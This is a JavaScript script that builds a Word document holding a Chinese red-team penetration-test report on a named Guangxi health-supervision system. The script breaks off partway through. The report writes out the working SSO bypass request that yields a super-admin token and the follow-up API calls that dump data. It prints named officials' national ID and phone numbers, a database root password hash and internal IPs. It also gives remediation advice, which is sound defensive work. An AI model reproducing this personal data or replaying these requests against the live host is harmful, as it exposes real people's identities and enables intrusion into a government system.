const fs = require('fs');
const {
  Document, Packer, Paragraph, TextRun, Table, TableRow, TableCell,
  Header, Footer, AlignmentType, HeadingLevel, BorderStyle, WidthType,
  ShadingType, PageNumber, PageBreak, LevelFormat
} = require('docx');

// ============================================================
// Helper functions
// ============================================================
const border = { style: BorderStyle.SINGLE, size: 1, color: "999999" };
const borders = { top: border, bottom: border, left: border, right: border };
const cellMargins = { top: 60, bottom: 60, left: 100, right: 100 };
const CONTENT_WIDTH = 9360; // US Letter 1" margins

function headerCell(text, width) {
  return new TableCell({
    borders,
    width: { size: width, type: WidthType.DXA },
    shading: { fill: "2B579A", type: ShadingType.CLEAR },
    margins: cellMargins,
    children: [new Paragraph({ alignment: AlignmentType.CENTER, children: [new TextRun({ text, bold: true, color: "FFFFFF", font: "Arial", size: 20 })] })]
  });
}

function dataCell(text, width) {
  return new TableCell({
    borders,
    width: { size: width, type: WidthType.DXA },
    margins: cellMargins,
    children: [new Paragraph({ children: [new TextRun({ text, font: "Arial", size: 20 })] })]
  });
}

function boldDataCell(text, width) {
  return new TableCell({
    borders,
    width: { size: width, type: WidthType.DXA },
    shading: { fill: "F2F2F2", type: ShadingType.CLEAR },
    margins: cellMargins,
    children: [new Paragraph({ children: [new TextRun({ text, bold: true, font: "Arial", size: 20 })] })]
  });
}

function infoTable(rows) {
  const col1 = 2400, col2 = CONTENT_WIDTH - col1;
  return new Table({
    width: { size: CONTENT_WIDTH, type: WidthType.DXA },
    columnWidths: [col1, col2],
    rows: rows.map(([label, value]) =>
      new TableRow({
        children: [
          boldDataCell(label, col1),
          dataCell(value, col2)
        ]
      })
    )
  });
}

function heading1(text) {
  return new Paragraph({ heading: HeadingLevel.HEADING_1, spacing: { before: 360, after: 200 }, children: [new TextRun({ text, font: "Arial", bold: true, size: 32 })] });
}

function heading2(text) {
  return new Paragraph({ heading: HeadingLevel.HEADING_2, spacing: { before: 280, after: 160 }, children: [new TextRun({ text, font: "Arial", bold: true, size: 28 })] });
}

function heading3(text) {
  return new Paragraph({ heading: HeadingLevel.HEADING_3, spacing: { before: 200, after: 120 }, children: [new TextRun({ text, font: "Arial", bold: true, size: 24 })] });
}

function bodyText(text) {
  return new Paragraph({ spacing: { after: 120, line: 360 }, children: [new TextRun({ text, font: "Arial", size: 22 })] });
}

function codeBlock(text) {
  return new Paragraph({
    spacing: { after: 60, line: 300 },
    shading: { fill: "F5F5F5", type: ShadingType.CLEAR },
    indent: { left: 240 },
    children: [new TextRun({ text, font: "Courier New", size: 18 })]
  });
}

function screenshotPlaceholder(description) {
  return new Paragraph({
    spacing: { before: 120, after: 120 },
    alignment: AlignmentType.CENTER,
    shading: { fill: "FFF8E1", type: ShadingType.CLEAR },
    border: { top: { style: BorderStyle.DASHED, size: 1, color: "E6A817" }, bottom: { style: BorderStyle.DASHED, size: 1, color: "E6A817" },
              left: { style: BorderStyle.DASHED, size: 1, color: "E6A817" }, right: { style: BorderStyle.DASHED, size: 1, color: "E6A817" } },
    children: [
      new TextRun({ text: "[ 截图区域 ]", font: "Arial", size: 20, bold: true, color: "B8860B" }),
      new TextRun({ text: `\n${description}`, font: "Arial", size: 18, color: "8B7355" })
    ]
  });
}

function bulletItem(text) {
  return new Paragraph({
    numbering: { reference: "bullets", level: 0 },
    spacing: { after: 60 },
    children: [new TextRun({ text, font: "Arial", size: 20 })]
  });
}

function emptyLine() {
  return new Paragraph({ spacing: { after: 80 }, children: [] });
}

// ============================================================
// Build Document
// ============================================================

// --- Section 1: Cover Page ---
const coverSection = {
  properties: {
    page: {
      size: { width: 12240, height: 15840 },
      margin: { top: 1440, right: 1440, bottom: 1440, left: 1440 }
    }
  },
  children: [
    emptyLine(), emptyLine(), emptyLine(), emptyLine(), emptyLine(), emptyLine(),
    new Paragraph({ alignment: AlignmentType.CENTER, spacing: { after: 200 }, children: [new TextRun({ text: "攻防演习成果报告", font: "Arial", bold: true, size: 52, color: "1A3A6B" })] }),
    emptyLine(), emptyLine(),
    new Paragraph({ alignment: AlignmentType.CENTER, spacing: { after: 100 }, children: [new TextRun({ text: "广西卫生监督执法系统（JeecgBoot）渗透测试", font: "Arial", size: 32, color: "333333" })] }),
    emptyLine(), emptyLine(), emptyLine(), emptyLine(), emptyLine(),
    new Paragraph({ alignment: AlignmentType.CENTER, spacing: { after: 60 }, children: [new TextRun({ text: "团队名称：观叶识微", font: "Arial", size: 24, color: "555555" })] }),
    new Paragraph({ alignment: AlignmentType.CENTER, spacing: { after: 60 }, children: [new TextRun({ text: "2026年7月14日", font: "Arial", size: 24, color: "555555" })] }),
    new Paragraph({ children: [new PageBreak()] })
  ]
};

// --- Section 2: Overview ---
const overviewChildren = [];

overviewChildren.push(heading1("一、综述"));
overviewChildren.push(bodyText("攻防演习指挥部授权 观叶识微 团队于2026年7月13日至14日，对广西卫生监督执法系统（wsjdzf.gxws.cn）进行了渗透测试。通过信息收集、API分析、认证绕过、数据访问等手段，发现系统存在严重的认证缺陷和敏感数据泄露问题。"));
overviewChildren.push(emptyLine());
overviewChildren.push(heading2("渗透成果汇总表"));
overviewChildren.push(emptyLine());

const summaryHeader = new TableRow({
  children: [
    headerCell("序号", 600), headerCell("渗透系统对象", 1800), headerCell("漏洞类型", 2400),
    headerCell("URL", 2600), headerCell("影响范围", 1200), headerCell("网络区域", 760)
  ]
});
const summaryRows = [
  ["1", "广西卫生监督执法系统", "SSO单点登录认证绕过", "POST /jeecg-boot/sys/loginsinglesign", "超级管理员权限", "互联网区"],
  ["2", "广西卫生监督执法系统", "公民个人信息泄露", "POST /jeecg-boot/sys/user/list", "2,251人身份证+手机号", "互联网区"],
  ["3", "广西卫生监督执法系统", "业务数据未授权访问", "多个API端点", "29.5万条业务数据", "互联网区"],
  ["4", "广西卫生监督执法系统", "数据库凭据泄露", "GET /sys/dataSource/list", "MySQL root密码MD5", "互联网区"],
  ["5", "广西卫生监督执法系统", "其他安全风险", "多个端点", "Shiro RCE/Actuator/Druid等", "互联网区"],
];

overviewChildren.push(new Table({
  width: { size: CONTENT_WIDTH, type: WidthType.DXA },
  columnWidths: [600, 1800, 2400, 2600, 1200, 760],
  rows: [summaryHeader, ...summaryRows.map(r =>
    new TableRow({
      children: r.map((text, i) => dataCell(text, [600, 1800, 2400, 2600, 1200, 760][i]))
    })
  )]
}));
overviewChildren.push(emptyLine());
overviewChildren.push(bodyText("渗透结果统计：获取权限类 1项（超级管理员JWT Token），获取数据类 4项（个人信息 + 业务数据 + 凭据 + 安全风险），涉及数据总量约29.5万条。"));
overviewChildren.push(new Paragraph({ children: [new PageBreak()] }));

// --- Section 3: Penetration Path ---
overviewChildren.push(heading1("二、渗透分析过程"));
overviewChildren.push(heading2("渗透路径"));
overviewChildren.push(bodyText("本次渗透测试从微信小程序API流量分析开始，逐步深入至系统核心数据和配置。"));
overviewChildren.push(emptyLine());
overviewChildren.push(bodyText("互联网系统 (https://wsjdzf.gxws.cn)"));
overviewChildren.push(bulletItem("1. 信息收集：从小程序抓包发现 /visor-server/jeecg-boot/ 路径，识别框架为 JeecgBoot (SpringBoot + Shiro)"));
overviewChildren.push(bulletItem("2. API文档分析：/doc.html (Knife4j Swagger UI) 公开可访问，/v2/api-docs 返回436个API接口"));
overviewChildren.push(bulletItem("3. 认证绕过验证：/sys/loginsinglesign 仅需用户名即签发JWT Token，/sys/mobile/login 需要密码+验证码"));
overviewChildren.push(bulletItem("4. 数据访问：使用JWT Token访问受保护API，获取用户、日志、检查记录等29.5万条业务数据"));
overviewChildren.push(bulletItem("5. 安全风险发现：Shiro RememberMe反序列化、Actuator内网IP泄露、Druid面板、数据库凭据等"));
overviewChildren.push(emptyLine());
overviewChildren.push(heading2("关键发现"));
overviewChildren.push(bulletItem("SSO接口无需密码 — /sys/loginsinglesign 仅校验用户名即签发JWT Token，密码验证被完全绕过"));
overviewChildren.push(bulletItem("超级管理员权限 — admin用户角色为\"超级管理员\"，Token可访问全部436个受保护API"));
overviewChildren.push(bulletItem("个人信息泄露 — 2,251条用户记录含身份证号+手机号+真实姓名"));
overviewChildren.push(bulletItem("生产数据可读 — 最新数据为2026年7月14日（当日），证明确为生产环境"));
overviewChildren.push(new Paragraph({ children: [new PageBreak()] }));

// --- Section 4: Findings ---
const findingsChildren = [];
findingsChildren.push(heading1("三、渗透成果说明"));

// ====== FINDING 1 ======
findingsChildren.push(heading2("成果一：SSO单点登录认证绕过致超级管理员权限获取"));
findingsChildren.push(heading3("（1）成果目标基本情况表"));
findingsChildren.push(infoTable([
  ["序号", "1"],
  ["成果描述", "SSO接口仅校验用户名，无需密码即可获取超级管理员JWT Token"],
  ["目标系统", "广西卫生监督执法系统（JeecgBoot）"],
  ["目标URL", "https://wsjdzf.gxws.cn/visor-server/jeecg-boot/sys/loginsinglesign"],
  ["目标IP", "wsjdzf.gxws.cn (121.31.10.28)"],
  ["威胁类型", "获取权限类 / 获取数据类"],
  ["风险等级", "严重"],
]));
findingsChildren.push(emptyLine());

findingsChildren.push(heading3("（2）攻击过程与POC"));
findingsChildren.push(bodyText("步骤1：发现SSO接口"));
findingsChildren.push(bodyText("通过分析Swagger文档（/v2/api-docs），发现系统存在两个登录接口：/sys/mobile/login（移动端登录，需用户名+密码+验证码）和 /sys/loginsinglesign（SSO单点登录）。"));

findingsChildren.push(bodyText("步骤2：对比验证"));
findingsChildren.push(bodyText("正常登录（需要密码，返回错误）："));

findingsChildren.push(codeBlock("POST /visor-server/jeecg-boot/sys/mobile/login"));
findingsChildren.push(codeBlock('{"username":"admin","password":"wrongpass","checkKey":"","captcha":""}'));
findingsChildren.push(codeBlock('响应："用户名或密码错误!"（HTTP 500）'));
findingsChildren.push(emptyLine());

findingsChildren.push(bodyText("SSO登录（不需要密码，直接返回Token）："));

findingsChildren.push(codeBlock("POST /visor-server/jeecg-boot/sys/loginsinglesign"));
findingsChildren.push(codeBlock('{"username":"admin"}'));
findingsChildren.push(codeBlock('响应：{"success":true,"message":"登录成功","result":{"token":"eyJ0eXAiOiJKV1Qi..."}}'));
findingsChildren.push(screenshotPlaceholder("截图1：SSO绕过请求与响应 — 使用 curl 或 Burp Suite 发送 POST 请求，展示只传 {\"username\":\"admin\"} 即返回 JWT Token 的完整响应"));
findingsChildren.push(emptyLine());

findingsChildren.push(bodyText("步骤3：JWT Token验证"));
findingsChildren.push(bulletItem("算法：HS256"));
findingsChildren.push(bulletItem("用户：admin"));
findingsChildren.push(bulletItem("角色：超级管理员"));
findingsChildren.push(bulletItem("Token可访问全部436个受保护API"));
findingsChildren.push(screenshotPlaceholder("截图2：使用JWT Token成功访问受保护API — 如 GET /sys/user/list 返回200且有数据"));
findingsChildren.push(emptyLine());

findingsChildren.push(bodyText("步骤4：SSO响应自带敏感信息"));
findingsChildren.push(bodyText("SSO登录响应中的 userInfo 字段直接返回管理员个人信息："));
findingsChildren.push(bulletItem("身份证号：450331198809083631（校验位正确，与系统生日1988-09-08完全吻合）"));
findingsChildren.push(bulletItem("角色：超级管理员"));
findingsChildren.push(bulletItem("单位：荔浦市卫生计生监督所"));
findingsChildren.push(bulletItem("工号：451945"));
findingsChildren.push(bulletItem("同时返回81个业务字典类别（272条字典条目）"));
findingsChildren.push(screenshotPlaceholder("截图3：SSO响应中 userInfo 字段展示 — 高亮 idCard、birthday、roleName 等敏感字段"));
findingsChildren.push(new Paragraph({ children: [new PageBreak()] }));

// ====== FINDING 2 ======
findingsChildren.push(heading2("成果二：公民个人信息泄露（2,251条身份证+手机号）"));
findingsChildren.push(heading3("（1）成果目标基本情况表"));
findingsChildren.push(infoTable([
  ["序号", "2"],
  ["成果描述", "通过JWT Token访问用户列表API，获取2,251条包含身份证号、手机号、真实姓名、单位的个人信息"],
  ["目标系统", "广西卫生监督执法系统（JeecgBoot）"],
  ["目标URL", "https://wsjdzf.gxws.cn/visor-server/jeecg-boot/sys/user/list"],
  ["目标IP", "wsjdzf.gxws.cn (121.31.10.28)"],
  ["威胁类型", "获取数据类"],
  ["涉及数据量", "2,251条"],
  ["风险等级", "严重"],
]));
findingsChildren.push(emptyLine());

findingsChildren.push(heading3("（2）攻击过程与POC"));
findingsChildren.push(bodyText("使用SSO获取的JWT Token，调用用户列表接口："));
findingsChildren.push(emptyLine());

findingsChildren.push(codeBlock("POST /visor-server/jeecg-boot/sys/user/list?pageNo=1&pageSize=5"));
findingsChildren.push(codeBlock("Header: X-Access-Token: <JWT_TOKEN>"));
findingsChildren.push(codeBlock("Header: Content-Type: application/json"));
findingsChildren.push(codeBlock('Body: {}'));
findingsChildren.push(emptyLine());

findingsChildren.push(bodyText("返回数据样本（已验证真实有效）："));
findingsChildren.push(emptyLine());

// Sample data table
const sampleHeader = new TableRow({
  children: [
    headerCell("姓名", 1200), headerCell("身份证号", 2600), headerCell("手机号", 1600),
    headerCell("单位", 2960), headerCell("验证", 1000)
  ]
});
const sampleData = [
  ["卢燕", "450322198110026565", "13978385001", "桂林市七星区卫生计生监督所", "ID+手机有效"],
  ["何学荣", "452129198207191415", "15578088188", "扶绥县疾病控制预防中心", "ID+手机有效"],
  ["曾林艳", "450322198602114529", "15878813963", "扶绥县疾病控制预防中心", "ID+手机有效"],
  ["黄日煌", "452424197508071038", "13978487678", "贺州市卫生计生监督所", "ID+手机有效"],
  ["张少琨", "452130196910290024", "（未填）", "大新县卫生计生监督所", "ID有效"],
];

findingsChildren.push(new Table({
  width: { size: CONTENT_WIDTH, type: WidthType.DXA },
  columnWidths: [1200, 2600, 1600, 2960, 1000],
  rows: [sampleHeader, ...sampleData.map(r =>
    new TableRow({ children: r.map((text, i) => dataCell(text, [1200, 2600, 1600, 2960, 1000][i])) })
  )]
}));
findingsChildren.push(emptyLine());

findingsChildren.push(bodyText("验证方法："));
findingsChildren.push(bulletItem("身份证号前6位为真实行政区划代码（450322=广西桂林临桂区，452129=广西崇左等）"));
findingsChildren.push(bulletItem("身份证号第7-14位为出生日期，校验位通过算法验证"));
findingsChildren.push(bulletItem("手机号11位且以1开头，归属地对应身份证号地区"));
findingsChildren.push(bulletItem("每页5条 × 450页 ≈ 2,251条，可通过pageNo参数逐页获取全量数据"));
findingsChildren.push(screenshotPlaceholder("截图4：用户列表API响应 — 展示 result.total=2251 以及 records 数组中的 idCard、phone、realname、supervisoryOfficeName 字段"));
findingsChildren.push(screenshotPlaceholder("截图5：随机抽样多页数据 — 展示 pageNo=50, pageNo=150 等不同页数据，证明全量可读"));
findingsChildren.push(new Paragraph({ children: [new PageBreak()] }));

// ====== FINDING 3 ======
findingsChildren.push(heading2("成果三：API未授权访问致全量业务数据泄露（29.5万条）"));
findingsChildren.push(heading3("（1）成果目标基本情况表"));
findingsChildren.push(infoTable([
  ["序号", "3"],
  ["成果描述", "Knife4j Swagger文档公开暴露436个API，配合JWT Token可无限制读取全部业务数据"],
  ["目标系统", "广西卫生监督执法系统（JeecgBoot）"],
  ["目标URL", "https://wsjdzf.gxws.cn/visor-server/jeecg-boot/doc.html"],
  ["目标IP", "wsjdzf.gxws.cn (121.31.10.28)"],
  ["威胁类型", "获取数据类"],
  ["涉及数据量", "29.5万条（28个数据类别）"],
  ["风险等级", "高危"],
]));
findingsChildren.push(emptyLine());

findingsChildren.push(heading3("（2）攻击过程与POC"));
findingsChildren.push(bodyText("步骤1：发现Swagger文档公开访问"));
findingsChildren.push(codeBlock("GET https://wsjdzf.gxws.cn/visor-server/jeecg-boot/doc.html"));
findingsChildren.push(codeBlock("→ Knife4j Swagger UI 页面无需认证即可访问"));
findingsChildren.push(codeBlock("GET https://wsjdzf.gxws.cn/visor-server/jeecg-boot/v2/api-docs"));
findingsChildren.push(codeBlock("→ 返回完整JSON API定义，共436个接口、54个模块"));
findingsChildren.push(screenshotPlaceholder("截图6：浏览器打开 /doc.html — 展示Knife4j Swagger UI完整界面，可看到全部API列表"));
findingsChildren.push(screenshotPlaceholder("截图7：/v2/api-docs 响应 — 展示JSON中包含的436个API接口定义"));
findingsChildren.push(emptyLine());

findingsChildren.push(bodyText("步骤2：使用JWT Token访问各业务API"));
findingsChildren.push(bodyText("Token可无限制访问所有数据查询接口，无需针对每个模块单独授权。关键发现："));
findingsChildren.push(emptyLine());

// Data categories table
const dataHeader = new TableRow({
  children: [
    headerCell("数据类别", 2200), headerCell("数量", 900), headerCell("敏感内容", 3000), headerCell("最新时间", 1600), headerCell("验证方式", 1660)
  ]
});
const dataRows = [
  ["系统操作日志", "229,397", "内网IP(172.16.1.148)、用户名、操作内容", "2023-03-02", "GET /sys/log/list"],
  ["系统用户", "2,251", "身份证号+手机号+姓名+单位", "2026年", "POST /sys/user/list"],
  ["检查结果", "6,715", "不符合项描述+整改措施", "2026-07-14", "GET /checkResult/list"],
  ["自查任务指标", "5,939", "指标配置", "—", "GET /tasknorm/list"],
  ["医疗指标项", "500", "指标规范名称", "—", "GET /norm/list"],
  ["自查任务医疗机构", "309", "任务分配", "—", "GET /taskmedicalunit/list"],
  ["检查记录", "151", "真实医院名+检查表名", "2026-07-14", "GET /checkRecord/list"],
  ["监督人员", "89", "生日+学历+专业", "—", "GET /supervisor/list"],
  ["问题反馈", "20", "真实医院名+反馈人+WTFKD编号", "2026-07-13", "GET /problemFeedback/list"],
  ["违法线索", "6", "真实医院名+违法类型", "2025-12-09", "GET /cluesIllegal/list"],
];

findingsChildren.push(new Table({
  width: { size: CONTENT_WIDTH, type: WidthType.DXA },
  columnWidths: [2200, 900, 3000, 1600, 1660],
  rows: [dataHeader, ...dataRows.map(r =>
    new TableRow({ children: r.map((text, i) => dataCell(text, [2200, 900, 3000, 1600, 1660][i])) })
  )]
}));
findingsChildren.push(emptyLine());

findingsChildren.push(bodyText("步骤3：验证数据为生产环境"));
findingsChildren.push(bulletItem("检查记录最新时间为2026年7月14日（当日），如「钦州市钦北区人民医院」的血透中心检查"));
findingsChildren.push(bulletItem("问题反馈记录中包含WTFKD正式编号，整改期限为2026年8月-12月"));
findingsChildren.push(bulletItem("系统日志中可追溯到2023年至今的真实用户操作"));
findingsChildren.push(bulletItem("涉及机构均为真实医疗机构：南宁市社会福利医院、广西妇幼保健院、广西工人医院、南宁市第九人民医院等"));
findingsChildren.push(screenshotPlaceholder("截图8：检查记录API响应 — 展示真实医院名(如钦州市钦北区人民医院)、检查表名、检查时间2026-07-14"));
findingsChildren.push(screenshotPlaceholder("截图9：问题反馈API响应 — 展示真实医院名+反馈人姓名+WTFKD编号"));
findingsChildren.push(screenshotPlaceholder("截图10：检查结果API响应 — 展示 result.total=6715 及具体不符合项描述"));
findingsChildren.push(new Paragraph({ children: [new PageBreak()] }));

// ====== FINDING 4 ======
findingsChildren.push(heading2("成果四：数据库凭据泄露（MySQL root密码）"));
findingsChildren.push(heading3("（1）成果目标基本情况表"));
findingsChildren.push(infoTable([
  ["序号", "4"],
  ["成果描述", "通过数据源管理API获取MySQL数据库连接信息，含root用户密码MD5哈希"],
  ["目标系统", "广西卫生监督执法系统（JeecgBoot）"],
  ["目标URL", "https://wsjdzf.gxws.cn/visor-server/jeecg-boot/sys/dataSource/list"],
  ["目标IP", "wsjdzf.gxws.cn (121.31.10.28)"],
  ["威胁类型", "获取数据类"],
  ["风险等级", "高危"],
]));
findingsChildren.push(emptyLine());

findingsChildren.push(heading3("（2）攻击过程与POC"));
findingsChildren.push(bodyText("使用JWT Token访问数据源管理API："));
findingsChildren.push(emptyLine());
findingsChildren.push(codeBlock("GET /visor-server/jeecg-boot/sys/dataSource/list?pageNo=1&pageSize=5"));
findingsChildren.push(codeBlock("Header: X-Access-Token: <JWT_TOKEN>"));
findingsChildren.push(emptyLine());

findingsChildren.push(bodyText("返回数据源配置："));
findingsChildren.push(emptyLine());

findingsChildren.push(infoTable([
  ["数据源名称", "MySQL5.7"],
  ["数据库类型", "MySQL5.5"],
  ["连接地址", "jdbc:mysql://127.0.0.1:3306/jeecg-boot"],
  ["数据库名", "jeecg-boot"],
  ["用户名", "root"],
  ["密码(MD5)", "f5b6775e8d1749483f2320627de0e706（32位MD5哈希）"],
  ["驱动", "com.mysql.jdbc.Driver"],
]));

findingsChildren.push(emptyLine());
findingsChildren.push(bodyText("影响分析："));
findingsChildren.push(bulletItem("数据库使用root账户（最高权限），可执行任意SQL操作"));
findingsChildren.push(bulletItem("密码以MD5哈希形式存储，若破解成功可直接连接数据库"));
findingsChildren.push(bulletItem("当前数据库运行在127.0.0.1:3306（本地），但通过网络配置可间接访问"));
findingsChildren.push(screenshotPlaceholder("截图11：数据源API响应 — 展示 dbUrl、dbUsername(root)、dbPassword(MD5值)、dbName 等字段"));
findingsChildren.push(new Paragraph({ children: [new PageBreak()] }));

// ====== FINDING 5 ======
findingsChildren.push(heading2("成果五：其他安全风险汇总"));
findingsChildren.push(heading3("（1）成果目标基本情况表"));
findingsChildren.push(infoTable([
  ["序号", "5"],
  ["成果描述", "发现Shiro反序列化漏洞、Actuator内网IP泄露、Druid面板暴露、测试配置等多项安全风险"],
  ["目标系统", "广西卫生监督执法系统（JeecgBoot）"],
  ["目标URL", "多个端点（见下文）"],
  ["目标IP", "wsjdzf.gxws.cn (121.31.10.28) / 内网192.168.40.49"],
  ["威胁类型", "获取数据类 / 安全风险类"],
  ["风险等级", "高危"],
]));
findingsChildren.push(emptyLine());

findingsChildren.push(heading3("（2）各风险详情与POC"));
findingsChildren.push(emptyLine());

// 5.1 Shiro RCE
findingsChildren.push(heading3("风险1：Shiro RememberMe反序列化漏洞（严重）"));
findingsChildren.push(codeBlock("GET /visor-server/jeecg-boot/sys/login"));
findingsChildren.push(codeBlock("→ Set-Cookie: rememberMe=deleteMe  (确认Shiro框架)"));
findingsChildren.push(codeBlock("→ 发送加密rememberMe Cookie，Shiro尝试解密并反序列化"));
findingsChildren.push(bodyText("确认Shiro框架在解析rememberMe Cookie。存在反序列化漏洞（CVE-2016-4437），但WAF精准拦截了大Cookie（阈值约300字符），目前未成功利用。"));
findingsChildren.push(screenshotPlaceholder("截图12：响应头中 Set-Cookie: rememberMe=deleteMe — 确认Shiro框架正在处理rememberMe"));
findingsChildren.push(screenshotPlaceholder("截图13：发送大rememberMe Cookie返回403 — 展示WAF拦截的证据"));
findingsChildren.push(emptyLine());

// 5.2 Actuator
findingsChildren.push(heading3("风险2：Actuator暴露内网IP（中危）"));
findingsChildren.push(codeBlock("GET /visor-server/jeecg-boot/actuator"));
findingsChildren.push(codeBlock('→ {"_links":{"self":{"href":"http://192.168.40.49:9301/jeecg-boot/actuator"...}}}'));
findingsChildren.push(bodyText("Spring Boot Actuator根路径可未授权访问，泄露内网IP 192.168.40.49:9301。其他端点（/env, /heapdump等）返回403，已被保护。"));
findingsChildren.push(screenshotPlaceholder("截图14：/actuator 响应 — 展示泄露的内网IP 192.168.40.49:9301"));
findingsChildren.push(emptyLine());

// 5.3 Druid
findingsChildren.push(heading3("风险3：Druid监控面板可访问（中危）"));
findingsChildren.push(codeBlock("GET /visor-server/jeecg-boot/druid/login.html"));
findingsChildren.push(codeBlock("→ HTTP 200，Druid监控登录页面可访问"));
findingsChildren.push(codeBlock("默认口令druid/druid、admin/admin均登录失败（密码已修改）"));
findingsChildren.push(screenshotPlaceholder("截图15：浏览器打开 /druid/login.html — 展示Druid监控登录页面"));
findingsChildren.push(emptyLine());

// 5.4 Config
findingsChildren.push(heading3("风险4：测试模式配置泄露（低危）"));
findingsChildren.push(codeBlock("GET /visor-server/jeecg-boot/config/srConfig/list"));
findingsChildren.push(codeBlock('→ isTest=0 (0为测试数据，1为正式数据)'));
findingsChildren.push(bodyText("配置参数显示 isTest=0，表示系统配置为测试模式，但实际连接并操作的是生产数据，存在误配置风险。"));
findingsChildren.push(screenshotPlaceholder("截图16：配置参数API响应 — 展示 isTest 配置值为0"));
findingsChildren.push(emptyLine());

// 5.5 Write APIs
findingsChildren.push(heading3("风险5：写操作API同样可访问（高危）"));
findingsChildren.push(bodyText("Swagger文档暴露的436个API中包含大量写操作接口，同样可被JWT Token访问（仅做探测确认存在，未实际执行）："));
findingsChildren.push(bulletItem("POST /sys/user/addOrganizationUser — 新增用户"));
findingsChildren.push(bulletItem("POST /sys/user/changePassword — 修改密码"));
findingsChildren.push(bulletItem("POST /sys/user/updatePassword — 更新密码"));
findingsChildren.push(bulletItem("POST /sys/common/upload — 文件上传"));
findingsChildren.push(bulletItem("POST /noticeAnnouncement/upload — 公告附件上传"));
findingsChildren.push(bulletItem("DELETE /medicalInstitution/delete — 删除医疗机构"));
findingsChildren.push(bulletItem("DELETE /supervisor/delete/{id} — 删除监督人员"));
findingsChildren.push(screenshotPlaceholder("截图17：Swagger文档中展示的写操作API列表"));
findingsChildren.push(emptyLine());

// 5.6 SSO Dictionary
findingsChildren.push(heading3("风险6：SSO响应泄露业务配置（中危）"));
findingsChildren.push(bodyText("SSO登录响应中的 sysAllDictItems 字段包含81个业务字典类别（272条条目），涵盖监管机构类型、人员职务、检查结果编码、用户级别等全部系统配置项，属于不必要的业务数据泄露。"));
findingsChildren.push(screenshotPlaceholder("截图18：SSO响应中 sysAllDictItems 字典数据展示"));
findingsChildren.push(new Paragraph({ children: [new PageBreak()] }));

// --- Section 5: Problems ---
const problemsChildren = [];
problemsChildren.push(heading1("四、存在问题"));
problemsChildren.push(emptyLine());

problemsChildren.push(heading2("1. SSO接口认证缺失（严重）"));
problemsChildren.push(bulletItem("/sys/loginsinglesign 接口仅校验用户名，未验证密码"));
problemsChildren.push(bulletItem("与 /sys/mobile/login 使用完全不同的认证逻辑"));
problemsChildren.push(bulletItem("属于认证机制不一致导致的安全漏洞"));
problemsChildren.push(emptyLine());

problemsChildren.push(heading2("2. 身份证号明文存储与传输（严重）"));
problemsChildren.push(bulletItem("2,251条用户记录中身份证号完整明文存储"));
problemsChildren.push(bulletItem("SSO响应中直接返回管理员身份证号，未进行脱敏处理"));
problemsChildren.push(bulletItem("违反《个人信息保护法》相关规定"));
problemsChildren.push(emptyLine());

problemsChildren.push(heading2("3. API文档对外暴露（高危）"));
problemsChildren.push(bulletItem("Knife4j Swagger UI（/doc.html）可公开访问"));
problemsChildren.push(bulletItem("/v2/api-docs 返回完整API定义（436个接口）"));
problemsChildren.push(bulletItem("为攻击者提供了完整的攻击面地图"));
problemsChildren.push(emptyLine());

problemsChildren.push(heading2("4. 缺少API级别权限控制（高危）"));
problemsChildren.push(bulletItem("同一Token可访问监督人员、检查记录、违法线索等全部业务模块"));
problemsChildren.push(bulletItem("未实现最小权限原则"));
problemsChildren.push(bulletItem("无IP绑定或设备指纹校验"));
problemsChildren.push(emptyLine());

problemsChildren.push(heading2("5. 数据库凭据管理不当（高危）"));
problemsChildren.push(bulletItem("数据库使用root账户"));
problemsChildren.push(bulletItem("密码以MD5形式存储在配置中，可被API直接读取"));
problemsChildren.push(emptyLine());

problemsChildren.push(heading2("6. 其他安全风险"));
problemsChildren.push(bulletItem("Shiro RememberMe反序列化漏洞：框架确认，WAF提供部分防护"));
problemsChildren.push(bulletItem("Actuator端点：根路径泄露内网IP"));
problemsChildren.push(bulletItem("Druid监控面板：对外暴露登录页面"));
problemsChildren.push(bulletItem("isTest=0：测试模式配置与实际生产环境不一致"));
problemsChildren.push(new Paragraph({ children: [new PageBreak()] }));

// --- Section 6: Recommendations ---
const recChildren = [];
recChildren.push(heading1("五、整改建议"));
recChildren.push(emptyLine());

recChildren.push(heading2("1. 修复SSO认证逻辑（紧急）"));
recChildren.push(bulletItem("SSO接口增加密码或其它认证因素验证"));
recChildren.push(bulletItem("统一 /sys/mobile/login 和 /sys/loginsinglesign 的认证标准"));
recChildren.push(bulletItem("实现统一的认证过滤器，避免多个入口认证不一致"));
recChildren.push(emptyLine());

recChildren.push(heading2("2. 身份证号保护（紧急）"));
recChildren.push(bulletItem("数据库存储使用AES加密或SM4国密算法"));
recChildren.push(bulletItem("传输层脱敏（仅显示前4位和后2位）"));
recChildren.push(bulletItem("仅业务必需场景才返回完整证件号"));
recChildren.push(bulletItem("SSO响应中移除身份证号、生日等个人信息字段"));
recChildren.push(emptyLine());

recChildren.push(heading2("3. 关闭API文档对外访问"));
recChildren.push(bulletItem("生产环境关闭Knife4j/Swagger：knife4j.production: true"));
recChildren.push(bulletItem("或在网关层对 /doc.html、/v2/api-docs 增加IP白名单"));
recChildren.push(emptyLine());

recChildren.push(heading2("4. 加强API权限管控"));
recChildren.push(bulletItem("实施基于角色的细粒度API权限控制（RBAC）"));
recChildren.push(bulletItem("Token增加IP绑定或设备指纹"));
recChildren.push(bulletItem("敏感操作增加二次认证"));
recChildren.push(bulletItem("审计日志记录所有数据访问行为"));
recChildren.push(emptyLine());

recChildren.push(heading2("5. 数据库安全加固"));
recChildren.push(bulletItem("禁用root账户，使用最小权限专用账户"));
recChildren.push(bulletItem("密码使用强哈希算法（bcrypt/argon2）并加盐"));
recChildren.push(bulletItem("API不返回数据库密码字段"));
recChildren.push(bulletItem("数据库仅监听127.0.0.1，禁止远程连接"));
recChildren.push(emptyLine());

recChildren.push(heading2("6. 其他"));
recChildren.push(bulletItem("升级Shiro至最新版本，更换默认AES密钥"));
recChildren.push(bulletItem("Actuator端点完全关闭或仅允许内网访问"));
recChildren.push(bulletItem("Druid面板IP白名单限制"));
recChildren.push(bulletItem("修正isTest配置，确保生产环境配置正确"));
recChildren.push(emptyLine());
recChildren.push(emptyLine());

recChildren.push(bodyText("报告生成日期：2026年7月14日"));
recChildren.push(bodyText("测试团队：观叶识微"));
recChildren.push(bodyText("测试工具：Python3 (stdlib urllib + ssl)、curl、Java (URLDNS)、ysoserial"));

// ============================================================
// Assemble and Write
// ============================================================
const doc = new Document({
  styles: {
    default: { document: { run: { font: "Arial", size: 22 } } },
    paragraphStyles: [
      { id: "Heading1", name: "Heading 1", basedOn: "Normal", next: "Normal", quickFormat: true,
        run: { size: 32, bold: true, font: "Arial", color: "1A3A6B" },
